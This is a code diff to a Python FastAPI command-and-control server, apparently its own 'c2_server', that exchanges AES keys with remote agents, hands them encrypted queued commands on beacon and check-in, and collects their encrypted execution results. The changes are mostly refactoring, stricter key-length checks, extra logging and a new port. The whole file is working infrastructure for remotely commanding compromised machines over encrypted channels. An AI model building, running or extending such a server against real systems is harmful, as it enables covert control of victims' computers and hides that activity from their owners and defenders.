@@ -20,7 +20,7 @@ import uvicorn
 app = FastAPI()
 agents: Dict[str, Dict] = {}
 
-# Configuring logging
+# Logging configuration
 logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
 
 class CheckinRequest(BaseModel):
@@ -45,7 +45,7 @@ class SystemInfoRequest(BaseModel):
     agent_id: str
     system_info: str
 
-# Load RSA Public Key in XML Format
+# Load RSA Public Key
 try:
     with open("public_key.xml", "r") as xml_file:
         PUBLIC_KEY_XML = xml_file.read()
@@ -55,7 +55,6 @@ except FileNotFoundError:
 
 @app.get("/public_key")
 def get_public_key():
-    """Send public key in XML format to agents."""
     if not PUBLIC_KEY_XML:
         raise HTTPException(status_code=500, detail="Public key not found")
     
@@ -63,8 +62,8 @@ def get_public_key():
     return {"PublicKey": PUBLIC_KEY_XML}
 
 def check_key_length(key: bytes) -> bytes:
-    if len(key) not in [16, 24, 32]:
-        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
+    if len(key) != 32:
+        raise ValueError(f"Incorrect AES key length ({len(key)} bytes). Expected 32 bytes.")
     return key
 
 def encrypt_data(data: str, key: bytes) -> str:
@@ -79,10 +78,12 @@ def decrypt_data(data: str, key: bytes) -> str:
     key = check_key_length(key)
     try:
         raw_data = base64.b64decode(data)
-        nonce, ct, tag = raw_data[:12], raw_data[12:-16], raw_data[-16:]
+        nonce = raw_data[:12]
+        cipher_text = raw_data[12:-16]
+        tag = raw_data[-16:]
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        pt = cipher.decrypt_and_verify(ct, tag)
-        return pt.decode('utf-8')
+        decrypted_text = cipher.decrypt_and_verify(cipher_text, tag)
+        return decrypted_text.decode('utf-8')
     except Exception as e:
         logging.error(f"Decryption failed: {str(e)}")
         raise HTTPException(status_code=400, detail="Decryption failed")
@@ -102,11 +103,13 @@ private_key = load_private_key()
 
 @app.post("/exchange_key")
 def exchange_key(request: KeyExchangeRequest):
-    """Handle the key exchange request from agents."""
     agent_id = request.AgentID
     enc_aes_key = request.EncAESKey
     try:
         aes_key = decrypt_aes_key(enc_aes_key, private_key)
+        if len(aes_key) != 32:
+            raise ValueError("Invalid AES key length after decryption!")
+
         agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
         logging.info(f"Key exchange successful for AgentID: {agent_id}")
         return {"Status": "Success"}
@@ -116,13 +119,12 @@ def exchange_key(request: KeyExchangeRequest):
 
 @app.post("/beacon")
 def beacon(request: BeaconRequest):
-    """Handle beacon from agents to keep the connection alive."""
     agent_id = request.AgentID
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail="Agent not found")
     
     aes_key = agents[agent_id]["aes_key"]
-    # Check for pending commands
+    
     if agents[agent_id]["commands"]:
         command = agents[agent_id]["commands"].pop(0)
         response = encrypt_data(command, aes_key)
@@ -130,7 +132,7 @@ def beacon(request: BeaconRequest):
     else:
         response = encrypt_data("NoCommand", aes_key)
         logging.info(f"No commands for agent {agent_id}")
-    
+
     return {"data": response}
 
 @app.post("/checkin")
@@ -140,6 +142,7 @@ def checkin(request: CheckinRequest):
         raise HTTPException(status_code=404, detail="Agent not found")
 
     aes_key = agents[agent_id]["aes_key"]
+
     if agents[agent_id]["commands"]:
         command = agents[agent_id]["commands"].pop(0)
         response = encrypt_data(command, aes_key)
@@ -156,11 +159,11 @@ def result(request: ResultRequest):
 
     try:
         decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
-        # Append the result to the agent's result list
         agents[agent_id]["results"].append(decrypted_result)
+
         message = f"Agent {agent_id} executed command with result: {decrypted_result}"
         logging.info(message)
-        print(message, flush=True)  # Print to console for real-time monitoring
+        print(message, flush=True)  # Print for real-time monitoring
     except Exception as e:
         logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
         raise HTTPException(status_code=400, detail="Decryption failed")
@@ -189,13 +192,14 @@ def send_command(request: CommandRequest):
     command = request.Command
     if agent_id in agents:
         agents[agent_id]["commands"].append(command)
+        logging.info(f"Command received from CLI: {command}")
         logging.info(f"Command sent to agent {agent_id}: {command}")
         return {"Status": "Command sent"}
+    logging.error(f"Agent not found: {agent_id}")
     raise HTTPException(status_code=404, detail="Agent not found")
 
 @app.get("/result")
 def get_result(agent_id: str = Query(..., alias="agent_id")):
-    """Get the result of the last command executed by the agent."""
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail="Agent not found")
 
@@ -208,7 +212,8 @@ def get_result(agent_id: str = Query(..., alias="agent_id")):
         return {"Result": "No result available"}
 
 def run_server():
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="debug")
 
 if __name__ == "__main__":
     run_server()
+
